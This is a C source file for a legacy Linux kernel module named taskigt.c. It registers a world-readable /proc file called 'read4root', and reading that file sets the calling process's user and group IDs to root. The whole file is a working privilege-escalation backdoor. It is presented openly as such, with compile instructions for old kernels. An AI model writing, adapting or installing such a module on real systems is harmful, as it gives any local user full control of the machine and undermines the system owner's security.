/*
 * taskigt.c by noupe [tm@ns2.crw.se]
 * Gives root to the process that reads the
 * special /proc file.
 *
 * Compile with: gcc -c -O2 -fomit-frame-pointer taskigt.c
 * Add -DOLDKERN if you're compiling for Linux 2.0.
 *
 */

#define __KERNEL__
#define MODULE
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/stat.h>
#include <linux/fs.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/proc_fs.h>

#define PROCNAME "read4root"
#define PROCNAMELEN 9 /* Length of the name above */

static int put_inf(char *, char **, off_t, int, int);

static int put_inf(char *d, char **start, off_t offset, int len, int foo)
{
	current->uid = 0;
	current->gid = 0;
	current->euid = 0;
	current->egid = 0;
	
	len = sprintf(d, "Gave root to PID %d (%s)\n", current->pid, current->comm);

	return len;
}


struct proc_dir_entry proc_ent = {
	0, 
	PROCNAMELEN, 
	PROCNAME,
	S_IFREG|S_IRUSR|S_IRGRP|S_IROTH,
	1,
	0,
	0,
	0,
	NULL,
	&put_inf
};


int init_module(void)
{
#ifdef OLDKERN
	proc_register_dynamic(&proc_root, &proc_ent); 
#else
	proc_register(&proc_root, &proc_ent); 
#endif
	return 0;
}


void cleanup_module(void)
{
	proc_unregister(&proc_root, proc_ent.low_ino);
}
